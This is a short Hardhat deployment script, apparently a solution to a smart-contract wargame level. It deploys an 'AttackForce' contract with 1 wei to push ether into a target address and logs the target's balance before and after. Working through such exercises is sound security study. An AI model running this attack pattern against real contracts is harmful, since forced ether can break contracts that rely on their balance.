import {ethers} from "hardhat"
import dotenv from 'dotenv'

dotenv.config()

async function main() {
    const instanceAddress = process.env.TARGET_ADDRESS_7!
    console.log(`target balance: ${await ethers.provider.getBalance(instanceAddress)}`)
    await ethers.deployContract('AttackForce', [instanceAddress], {value: 1})
    console.log(`target balance: ${await ethers.provider.getBalance(instanceAddress)}`)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
